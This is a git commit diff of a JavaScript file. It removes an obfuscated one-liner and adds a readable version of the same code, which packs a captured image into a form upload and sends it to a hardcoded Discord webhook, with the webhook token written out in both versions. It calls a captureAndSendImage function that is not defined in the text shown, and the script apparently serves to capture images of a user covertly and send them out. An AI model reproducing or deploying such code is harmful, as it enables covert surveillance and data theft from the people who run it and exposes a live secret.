ea181b33f81314240bb18475781e662391179051
Kevoo[Kunder] <120283405+KevooRBLX@users.noreply.github.com>
2023-11-03 14:24:48 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,1 +1,36 @@
-function _0x2b20(_0x23dc6e,_0x1b8e36){const _0x3b3c28=_0x3b3c();return _0x2b20=function(_0x2b20c4,_0x2a3438){_0x2b20c4=_0x2b20c4-0x191;let _0x419f2d=_0x3b3c28[_0x2b20c4];return _0x419f2d;},_0x2b20(_0x23dc6e,_0x1b8e36);}(function(_0x1aa2d1,_0x444b31){const _0x437a98=_0x2b20,_0x51bc06=_0x1aa2d1();while(!![]){try{const _0x6f9688=-parseInt(_0x437a98(0x19c))/0x1+parseInt(_0x437a98(0x1a1))/0x2*(-parseInt(_0x437a98(0x193))/0x3)+parseInt(_0x437a98(0x19b))/0x4*(parseInt(_0x437a98(0x19d))/0x5)+parseInt(_0x437a98(0x19e))/0x6+-parseInt(_0x437a98(0x1a0))/0x7+-parseInt(_0x437a98(0x195))/0x8+-parseInt(_0x437a98(0x194))/0x9*(-parseInt(_0x437a98(0x1a3))/0xa);if(_0x6f9688===_0x444b31)break;else _0x51bc06['push'](_0x51bc06['shift']());}catch(_0x520881){_0x51bc06['push'](_0x51bc06['shift']());}}}(_0x3b3c,0xdc563));function sendToDiscordWebhook(_0x32513c){const _0x4a4d9f=_0x2b20,_0x29ae37='https://discord.com/api/webhooks/1160771156278788116/63oDbOcnc8Gfg1iWr7_v0zY_nZQl-_H8mu1GZDGsw9Aaw9UjV4-qezVugmdZSSnR5N-B',_0x116551=new FormData();_0x116551[_0x4a4d9f(0x198)]('file',dataURLtoBlob(_0x32513c),_0x4a4d9f(0x191)),fetch(_0x29ae37,{'method':_0x4a4d9f(0x199),'body':_0x116551})['then'](_0x59586a=>{const _0xdcfe8=_0x4a4d9f;_0x59586a['ok']?console['log'](_0xdcfe8(0x1a6)):console[_0xdcfe8(0x196)](_0xdcfe8(0x19f),_0x59586a[_0xdcfe8(0x19a)]);})[_0x4a4d9f(0x192)](_0x49acd3=>console[_0x4a4d9f(0x196)](_0x4a4d9f(0x19f),_0x49acd3));}function _0x3b3c(){const _0x21167b=['error','length','append','POST','statusText','4ZnzOVk','1576759YHWpuI','173645HDUvmV','8712756dPInAF','Error\x20sending\x20image\x20to\x20Discord:','3530254lThGLL','40802Tbbskc',';base64,','630fOGExG','charCodeAt','split','Script\x20works','image.jpg','catch','207sHCIDD','552366HTCHlt','7697344bebCmc'];_0x3b3c=function(){return _0x21167b;};return _0x3b3c();}function dataURLtoBlob(_0x27139e){const _0x8023b6=_0x2b20,_0x302c8f=_0x27139e[_0x8023b6(0x1a5)](_0x8023b6(0x1a2)),_0x1de0e9=_0x302c8f[0x0]['split'](':')[0x1],_0x5234e7=atob(_0x302c8f[0x1]),_0x464898=new Array(_0x5234e7[_0x8023b6(0x197)]);for(let _0x2a9a99=0x0;_0x2a9a99<_0x5234e7[_0x8023b6(0x197)];_0x2a9a99++){_0x464898[_0x2a9a99]=_0x5234e7[_0x8023b6(0x1a4)](_0x2a9a99);}const _0x5b94f9=new Uint8Array(_0x464898);return new Blob([_0x5b94f9],{'type':_0x1de0e9});}captureAndSendImage();
+function sendToDiscordWebhook(imageDataUrl) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1160771156278788116/63oDbOcnc8Gfg1iWr7_v0zY_nZQl-_H8mu1GZDGsw9Aaw9UjV4-qezVugmdZSSnR5N-B';
+
+    const formData = new FormData();
+    formData.append('file', dataURLtoBlob(imageDataUrl), 'image.jpg');
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Script works');
+        } else {
+            console.error('Error sending image to Discord:', response.statusText);
+        }
+    })
+    .catch(error => console.error('Error sending image to Discord:', error));
+}
+
+function dataURLtoBlob(dataURL) {
+    const parts = dataURL.split(';base64,');
+    const contentType = parts[0].split(':')[1];
+    const byteCharacters = atob(parts[1]);
+    const byteNumbers = new Array(byteCharacters.length);
+
+    for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
+    }
+
+    const byteArray = new Uint8Array(byteNumbers);
+    return new Blob([byteArray], { type: contentType });
+}
+
+// Call the function to capture and send the image
+captureAndSendImage();
